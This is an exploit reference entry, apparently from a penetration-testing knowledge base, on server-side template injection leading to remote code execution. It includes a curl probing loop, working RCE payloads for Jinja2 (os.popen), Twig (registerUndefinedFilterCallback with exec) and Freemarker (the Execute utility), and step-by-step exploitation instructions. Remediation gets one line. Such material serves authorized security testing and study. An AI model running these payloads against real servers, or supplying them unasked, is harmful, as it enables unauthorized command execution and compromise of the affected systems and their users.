---
title: SSTI template injection → RCE (Jinja2 / Twig / Freemarker)
cve: None (implementation flaw)
severity: critical
cvss: 9.0
product: Template engines (Python/Java/PHP server-side rendering)
versions: Any
ports: 80, 443
keywords: ssti, template injection, jinja2, twig, freemarker, rce
entry: User input concatenated into template strings
verified: false
sources: Compiled from public sources (implementation flaws)
---

## Fingerprinting

- User input is reflected in pages/emails (`Hello {{name}}`);
- Error pages show template engine names (Jinja2/Twig/Freemarker/Thymeleaf).

## Prerequisites

- Input enters template **source code** (rather than being passed as a variable).

## PoC

```bash
# 1) Probe (try each of the three syntax styles)
for p in '7*7' '{{7*7}}' '${7*7}' '#{7*7}' '{{7*"7"}}'; do
  echo "== $p"; curl -s "https://target/greet?name=$(python3 -c "import urllib.parse,sys;print(urllib.parse.quote(sys.argv[1]))" "$p")" | grep -o '49\|7777777' | head -2
done
# Output of 49 = the engine evaluates the expression
```

```bash
# 2) Jinja2 → RCE
# {{ cycler.__init__.__globals__.os.popen('id').read() }}
# 3) Twig → RCE (Twig 1.x/2.x)
# {{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}
# 4) Freemarker → RCE
# <#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}
```

```bash
# 5) Verify with one command (Jinja2)
curl -s 'https://target/greet' --get --data-urlencode "name={{7*7}}" | grep -o 49
```

## Exploitation Steps

1. Probe the engine with the three syntax styles;
2. Run `id` first using an RCE payload for that engine;
3. If no output is returned, use out-of-band verification (DNS/HTTP);
4. Evidence: output or out-of-band logs.

## Remediation and Mitigation

- Pass user input only as variables; prohibit template string concatenation; sandbox the engine.

## References

- OWASP SSTI；CWE-1336。
